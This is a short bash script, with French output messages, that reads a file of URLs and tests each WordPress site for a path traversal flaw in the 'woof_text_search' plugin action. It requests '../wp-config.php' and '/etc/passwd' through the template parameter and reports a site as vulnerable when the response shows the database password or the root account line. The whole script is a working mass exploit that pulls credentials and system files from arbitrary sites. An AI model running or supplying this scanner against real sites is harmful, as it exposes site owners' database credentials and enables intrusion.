#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: $0 fichier_urls.txt"
    exit 1
fi

while IFS= read -r url; do

    target1="${url}/?action=woof_text_search&template=../wp-config.php"
    response1=$(curl -s "$target1")

    if echo "$response1" | grep -q 'DB_PASSWORD'; then
        echo "[VULNÉRABLE] $url - Inclusion de wp-config.php"
    fi

    target2="${url}/wp-admin/admin-ajax.php?template=../../../../../../etc/passwd&value=a&min_symbols=1"
    response2=$(curl -s -X POST -d "action=woof_text_search" "$target2")

    if echo "$response2" | grep -q 'root:x:0:0:'; then
        echo "[VULNÉRABLE] $url - Inclusion de /etc/passwd"
    fi

done < "$1"
